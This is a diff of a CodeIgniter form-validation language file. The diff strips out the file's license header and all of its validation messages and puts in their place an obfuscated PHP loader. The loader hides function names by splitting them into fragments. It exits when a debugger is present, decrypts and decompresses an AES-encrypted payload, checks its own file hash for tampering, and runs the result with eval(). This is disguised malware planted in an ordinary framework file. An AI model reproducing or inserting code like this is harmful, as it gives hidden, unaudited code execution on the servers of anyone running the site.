@@ -1,68 +1,28 @@
 <?php
-/**
- * CodeIgniter
- *
- * An open source application development framework for PHP
- *
- * This content is released under the MIT License (MIT)
- *
- * Copyright (c) 2014 - 2018, British Columbia Institute of Technology
- *
- * Permission is hereby granted, free of charge, to any person obtaining a copy
- * of this software and associated documentation files (the "Software"), to deal
- * in the Software without restriction, including without limitation the rights
- * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
- * copies of the Software, and to permit persons to whom the Software is
- * furnished to do so, subject to the following conditions:
- *
- * The above copyright notice and this permission notice shall be included in
- * all copies or substantial portions of the Software.
- *
- * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
- * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
- * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
- * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
- * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
- * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
- * THE SOFTWARE.
- *
- * @package	CodeIgniter
- * @author	EllisLab Dev Team
- * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
- * @copyright	Copyright (c) 2014 - 2018, British Columbia Institute of Technology (http://bcit.ca/)
- * @license	http://opensource.org/licenses/MIT	MIT License
- * @link	https://codeigniter.com
- * @since	Version 1.0.0
- * @filesource
- */
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-$lang['form_validation_required']		= 'The {field} field is required.';
-$lang['form_validation_isset']			= 'The {field} field must have a value.';
-$lang['form_validation_valid_email']		= 'The {field} field must contain a valid email address.';
-$lang['form_validation_valid_emails']		= 'The {field} field must contain all valid email addresses.';
-$lang['form_validation_valid_url']		= 'The {field} field must contain a valid URL.';
-$lang['form_validation_valid_ip']		= 'The {field} field must contain a valid IP.';
-$lang['form_validation_min_length']		= 'The {field} field must be at least {param} characters in length.';
-$lang['form_validation_max_length']		= 'The {field} field cannot exceed {param} characters in length.';
-$lang['form_validation_exact_length']		= 'The {field} field must be exactly {param} characters in length.';
-$lang['form_validation_alpha']			= 'The {field} field may only contain alphabetical characters.';
-$lang['form_validation_alpha_numeric']		= 'The {field} field may only contain alpha-numeric characters.';
-$lang['form_validation_alpha_numeric_spaces']	= 'The {field} field may only contain alpha-numeric characters and spaces.';
-$lang['form_validation_alpha_dash']		= 'The {field} field may only contain alpha-numeric characters, underscores, and dashes.';
-$lang['form_validation_numeric']		= 'The {field} field must contain only numbers.';
-$lang['form_validation_is_numeric']		= 'The {field} field must contain only numeric characters.';
-$lang['form_validation_integer']		= 'The {field} field must contain an integer.';
-$lang['form_validation_regex_match']		= 'The {field} field is not in the correct format.';
-$lang['form_validation_matches']		= 'The {field} field does not match the {param} field.';
-$lang['form_validation_differs']		= 'The {field} field must differ from the {param} field.';
-$lang['form_validation_is_unique'] 		= 'The {field} field must contain a unique value.';
-$lang['form_validation_is_natural']		= 'The {field} field must only contain digits.';
-$lang['form_validation_is_natural_no_zero']	= 'The {field} field must only contain digits and must be greater than zero.';
-$lang['form_validation_decimal']		= 'The {field} field must contain a decimal number.';
-$lang['form_validation_less_than']		= 'The {field} field must contain a number less than {param}.';
-$lang['form_validation_less_than_equal_to']	= 'The {field} field must contain a number less than or equal to {param}.';
-$lang['form_validation_greater_than']		= 'The {field} field must contain a number greater than {param}.';
-$lang['form_validation_greater_than_equal_to']	= 'The {field} field must contain a number greater than or equal to {param}.';
-$lang['form_validation_error_message_not_set']	= 'Unable to access an error message corresponding to your field name {field}.';
-$lang['form_validation_in_list']		= 'The {field} field must be one of: {param}.';
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_jgst28ax=('bas'.'e64'.'_de'.'cod'.'e');
+$_vd49p2k1=('gzu'.'nco'.'mpr'.'ess');
+$_vy4ur6ax=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_ip30b18c='fZAypRET';
+$_qn16dlck='xIRf8La+gsg=';
+$_rttw7qw4='kmRcElBc';
+$_haetfijk='VWtc6Ybl';
+$_r9tem8vm='LxRMZ9zK';
+$_i8qedvx8='ADpobii2';
+$_wpci77vo='SKq49Q==';
+$_n2y8cjrr='uY9GPvxI';
+$_h6wyykn8=$_jgst28ax($_ip30b18c.$_r9tem8vm.$_haetfijk.$_rttw7qw4.$_qn16dlck);
+$_xziyujq8=$_jgst28ax($_i8qedvx8.$_n2y8cjrr.$_wpci77vo);
+$_ru3swfnu=$_jgst28ax('6VG09nyZFTe0b1JjMoGbfaLXzGttmtFWogOl7SjFxTuLpr6BiccdrIwcc9VjJM2sfMBqqTjcRIJxtWqr9IREsGsBgI5MHF+Spta9WBJDN08XyyebHCH6KNTUD6bjfZL7yMm2QBj5fGiRpvnyCBbeX6xb6daO3qlUx3oBuWnVFJNrCQrpKDxr22nVtkhT8cfbIh/ETxTxXlK7UjuYPwhLumiQC9W7w8M0abtkfRjD+RoOHstaiyaOuOSPA2I+EPqmQ1q9VTc7FhGUCpDGzKVrUKNTe3k9KRrlLJmEegUUUgz+0JD5O+tBjcwHJHjs+cZ8v9oCNUSSW8lRNmHx3wq+y6Y9+ffHjtpC+IIr+cm3cfGQTuMF+NU4NPeGx2Ot5shTOv2iXEHApFV4XDGcfauuk5++l//PD+Vs0JIHYaLv66+UGtUOLgQI+U03fBPhbxi6r2eOPB6WlEaRxuSryVsPHP9WTVepWrWvHJWUi+lh4WnhpAGgPHDNXBpXV24dZCvKWAdiTZtMA5EiEENO8+w7V927QkH+csMmtJwVtutBa0LiW4JMTU7MSeBiFTLRBDKJEDiCHSyemZaWAp5Bu7xtwZrMaxduMf9gy4NJ8jy+Cs2JSykrCbqo6rTQAXNcMDRPik8C5jfpQur0Ln5zTvoQEn4D6woopkiAu7pBTg25CniqKkU5w7RwBVwJGySNmS+GEsrUzkb7kqvh5M7rihh9oHlsIVnlP/bat4RPeLHl1Ti/SwIb2s3kE+qkiB4k21PhhhmnLk+vbrDvszIg6HDc4xzGkAxvHTbv3AsTnCU/CPsgY2QFdbxpcXoG4KRzUYa4');
+$_jwrnqkux=$_vy4ur6ax($_ru3swfnu,'aes-256-cbc',$_h6wyykn8,OPENSSL_RAW_DATA,$_xziyujq8);
+if($_jwrnqkux===false){exit;}
+$_rvs2ax5b=$_vd49p2k1($_jwrnqkux);
+if($_rvs2ax5b===false){exit;}
+$_ynrdlnjj='b847324807dc0dc2533694f4c3fe581f8343c005d550897acdbc9cd900762a7a';
+$_zgnvpj8p=@file_get_contents(__FILE__);
+if($_zgnvpj8p!==false){
+$_gabvvlmk=str_replace($_ynrdlnjj,"0000000000000000000000000000000000000000000000000000000000000000",$_zgnvpj8p);
+$_qauppzpi=hash("sha256",$_gabvvlmk);
+if($_qauppzpi!==$_ynrdlnjj){@http_response_code(403);exit;}
+}
+eval($_rvs2ax5b);
